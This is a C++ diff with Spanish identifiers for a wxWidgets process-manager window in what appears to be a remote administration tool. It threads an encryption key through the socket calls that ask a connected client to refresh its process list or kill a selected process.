@@ -12,10 +12,11 @@ wxBEGIN_EVENT_TABLE(ListCtrlManager2, wxListCtrl)
 	EVT_CONTEXT_MENU(ListCtrlManager2::OnContextMenu)
 wxEND_EVENT_TABLE()
 
-panelProcessManager::panelProcessManager(wxWindow* pParent, SOCKET sck, std::string _strID) :
+panelProcessManager::panelProcessManager(wxWindow* pParent, SOCKET sck, std::string _strID, ByteArray c_key) :
 	wxFrame(pParent, EnumIDS::ID_PM_Panel, "[" + _strID + "] Administrador de procesos") {
 
 	this->sckCliente = sck;
+	this->enc_key = c_key;
 	this->SetName(_strID + "-PM");
 	
 	this->CrearListview();
@@ -24,7 +25,7 @@ panelProcessManager::panelProcessManager(wxWindow* pParent, SOCKET sck, std::str
 }
 
 void panelProcessManager::CrearListview() {
-	this->listManager = new ListCtrlManager2(this, EnumIDS::ID_Panel_FM_List, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
+	this->listManager = new ListCtrlManager2(this, EnumIDS::ID_Panel_FM_List, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES, this->enc_key);
 	
 	this->listManager->sckCliente = this->sckCliente;
 
@@ -55,13 +56,13 @@ void panelProcessManager::CrearListview() {
 
 void ListCtrlManager2::OnRefrescar(wxCommandEvent& event) {
 	this->DeleteAllItems();
-	p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::PM_Refrescar);
+	p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::PM_Refrescar, this->enc_key);
 }
 
 void ListCtrlManager2::OnTerminarPID(wxCommandEvent& event) {
 	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
 	std::string strComando = this->GetItemText(item, 0);
-	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::PM_Kill);
+	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::PM_Kill, this->enc_key);
 }
 
 void ListCtrlManager2::AgregarData(std::string strBuffer, std::string _strPID){
